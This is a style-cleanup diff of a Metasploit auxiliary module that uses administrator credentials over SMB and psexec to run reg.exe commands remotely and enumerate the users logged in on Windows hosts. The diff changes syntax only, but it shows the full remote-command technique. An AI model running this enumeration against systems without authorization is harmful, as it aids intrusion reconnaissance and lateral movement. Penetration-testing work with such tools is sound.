@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -5,7 +6,6 @@
 
 require 'msf/core'
 class MetasploitModule < Msf::Auxiliary
-
   # Exploit mixins should be called first
   include Msf::Exploit::Remote::SMB::Client::Psexec
   include Msf::Auxiliary::Report
@@ -19,11 +19,11 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'        => 'Microsoft Windows Authenticated Logged In Users Enumeration',
-      'Description' => %Q{
+      'Description' => %(
           This module uses a valid administrator username and password to enumerate users
         currently logged in, using a similar technique than the "psexec" utility provided
         by SysInternals. It uses reg.exe to query the HKU base registry key.
-      },
+      ),
       'Author'      =>
         [
           'Royce Davis @R3dy__ <rdavis[at]accuvant.com>' # Metasploit module
@@ -34,15 +34,15 @@ class MetasploitModule < Msf::Auxiliary
         [ 'URL', 'http://www.pentestgeek.com/2012/11/05/finding-logged-in-users-metasploit-module/' ],
         [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
       ],
-      'License'     => MSF_LICENSE
+      'License' => MSF_LICENSE
     )
 
     register_options([
-      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
-      OptString.new('USERNAME', [false, 'The name of a specific user to search for', '']),
-      OptString.new('RPORT', [true, 'The Target port', 445]),
-      OptString.new('WINPATH', [true, 'The name of the Windows directory', 'WINDOWS']),
-    ], self.class)
+                       OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
+                       OptString.new('USERNAME', [false, 'The name of a specific user to search for', '']),
+                       OptString.new('RPORT', [true, 'The Target port', 445]),
+                       OptString.new('WINPATH', [true, 'The name of the Windows directory', 'WINDOWS'])
+                     ], self.class)
 
     deregister_options('RHOST')
   end
@@ -59,12 +59,12 @@ class MetasploitModule < Msf::Auxiliary
       connect
       smb_login
     rescue StandardError => autherror
-      print_error("#{autherror}")
+      print_error(autherror.to_s)
       return
     end
 
     keys = get_hku(ip, smbshare, cmd, text, bat)
-    if !keys
+    unless keys
       cleanup_after(cmd, text, bat)
       disconnect
       return
@@ -84,8 +84,8 @@ class MetasploitModule < Msf::Auxiliary
       command = "#{cmd} /C echo reg.exe QUERY HKU ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
       out = psexec(command)
       output = get_output(ip, smbshare, text)
-      cleanout = Array.new
-      output.each_line { |line| cleanout << line.chomp if line.include?("HKEY") && line.split("-").size == 8 && !line.split("-")[7].include?("_")}
+      cleanout = []
+      output.each_line { |line| cleanout << line.chomp if line.include?("HKEY") && line.split("-").size == 8 && !line.split("-")[7].include?("_") }
       return cleanout
     rescue StandardError => hku_error
       print_error("Error runing query against HKU. #{hku_error.class}. #{hku_error}")
@@ -110,13 +110,13 @@ class MetasploitModule < Msf::Auxiliary
 
   def report_user(username)
     report_note(
-      :host => rhost,
-      :proto => 'tcp',
-      :sname => 'smb',
-      :port => rport,
-      :type => 'smb.domain.loggedusers',
-      :data => "#{username} is logged in",
-      :update => :unique_data
+      host: rhost,
+      proto: 'tcp',
+      sname: 'smb',
+      port: rport,
+      type: 'smb.domain.loggedusers',
+      data: "#{username} is logged in",
+      update: :unique_data
     )
   end
 
@@ -128,9 +128,13 @@ class MetasploitModule < Msf::Auxiliary
       command = "#{cmd} /C echo reg.exe QUERY \"HKU\\#{key}\\Volatile Environment\" ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
       out = psexec(command)
       if output = get_output(ip, smbshare, text)
-        domain, username, dnsdomain, homepath, logonserver = "","","","",""
+        domain = ""
+        username = ""
+        dnsdomain = ""
+        homepath = ""
+        logonserver = ""
         # Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
-        if datastore['USERNAME'].length > 0
+        unless datastore['USERNAME'].empty?
           output.each_line do |line|
             username = line if line.include?("USERNAME")
             domain = line if line.include?("USERDOMAIN")
@@ -148,24 +152,22 @@ class MetasploitModule < Msf::Auxiliary
           homepath = line if line.include?("HOMEPATH")
           logonserver = line if line.include?("LOGONSERVER")
         end
-        if username.length > 0 && domain.length > 0
+        if !username.empty? && !domain.empty?
           user = domain.split(" ")[2].to_s + "\\" + username.split(" ")[2].to_s
-          print_good("#{user}")
+          print_good(user.to_s)
           report_user(user.chomp)
-        elsif logonserver.length > 0 && homepath.length > 0
+        elsif !logonserver.empty? && !homepath.empty?
           uname = homepath.split('\\')[homepath.split('\\').size - 1]
-          if uname.include?(".")
-            uname = uname.split(".")[0]
-          end
+          uname = uname.split(".")[0] if uname.include?(".")
           user = logonserver.split('\\\\')[1].chomp.to_s + "\\" + uname.to_s
-          print_good("#{user}")
+          print_good(user.to_s)
           report_user(user.chomp)
         else
           username = query_session(smbshare, ip, cmd, text, bat)
           if username
             hostname = (dnsdomain.split(" ")[2] || "").split(".")[0] || "."
             user = "#{hostname}\\#{username}"
-            print_good("#{user}")
+            print_good(user.to_s)
             report_user(user.chomp)
           else
             print_status("Unable to determine user information for user: #{key}")
@@ -211,5 +213,4 @@ class MetasploitModule < Msf::Auxiliary
       return nil
     end
   end
-
 end
